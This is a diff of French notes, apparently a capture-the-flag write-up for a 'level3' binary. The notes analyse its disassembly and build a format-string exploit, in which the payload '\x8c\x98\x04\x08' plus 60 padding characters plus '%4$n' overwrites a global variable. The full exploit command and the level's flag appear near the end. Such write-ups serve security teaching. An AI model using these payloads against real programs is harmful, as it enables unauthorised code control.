@@ -30,13 +30,10 @@ ebp < +0 >
 
 
 
-fonction stdin stockée dans eax
+Fonction stdin stockée dans eax
 eax stocké dans ebp-528 => à ebp-528, on a l'adresse de stdin stockée
-
 on stock la valeur 512 à ebp-532
-
 on charge dans eax l'adresse ebp-520
-
 on met la valeur d'eax dans esp => esp vaut l'adresse ebp-520
 
 on appele fgets (buffer, size, inputstream)
@@ -47,13 +44,9 @@ on appele fgets (buffer, size, inputstream)
 
 
 on charge dans eax l'adresse ebp-520
-
 on met la valeur d'eax dans esp => esp vaut l'adresse ebp-520
 
-printf de la string ? (printf("%s"), str)
-
-on met <m> ("" ou 0) ? dans eax
-
+printf de la string entrée : (printf("%s"), str)
 on compare eax avec 64
 
   si pas = à 64 => terminé, on leave la fonction
@@ -94,6 +87,12 @@ Dans notre cas, l'adresse est stockée sur l'argument #4 donc il faut envoyer à
 En remplacant "adresse" par notre adresse, on a alors => "\x8c\x98\x04\x08%4$n" => et on a donc 4 à l'adresse 0x804988c
 Et pour passer de 4 à 64, on rajoute 60 chars => '\x8c\x98\x04\x08'+ 'B' * 60 + '%4$n'
 
-On exécute ./level3 avec cette chaine en entrée => (python -c "print ('\x8c\x98\x04\x08'+ 'B' * 60 + '%4\$n')"; cat) | ./level3
 
-flag : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+Commande : 
+
+> (python -c "print ('\x8c\x98\x04\x08'+ 'B' * 60 + '%4\$n')"; cat) | ./level3
+
+Flag : 
+
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
